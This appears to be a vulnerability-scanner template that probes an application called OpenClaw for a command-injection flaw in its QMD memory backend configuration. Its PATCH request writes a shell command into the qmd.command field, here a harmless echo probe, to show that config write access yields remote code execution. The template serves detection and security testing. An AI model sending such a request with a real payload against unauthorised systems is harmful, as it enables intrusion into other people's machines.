http:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - qmd
    - command
  matchers-condition: and
  raw:
  - 'GET /api/config HTTP/1.1

    Host: {{Hostname}}

    Authorization: Bearer {{token}}

    '
- matchers:
  - status:
    - 200
    - 201
    - 204
    type: status
  matchers-condition: and
  raw:
  - 'PATCH /api/config HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json

    Authorization: Bearer {{token}}


    {"memory":{"backend":"qmd","backendConfig":{"qmd":{"command":"echo lobster-guard-probe"}}}}

    '
id: openclaw-qmd-cmd-inject
info:
  author: LobsterGuard
  description: 'QMD memory backend config accepts arbitrary command strings via qmd.command

    without sanitization. Config write access leads to RCE.

    Source: memory/backend-config.ts:316-318

    '
  name: OpenClaw QMD Memory Command Injection (VULN-32)
  severity: critical
  tags: openclaw,rce,injection,memory,v4
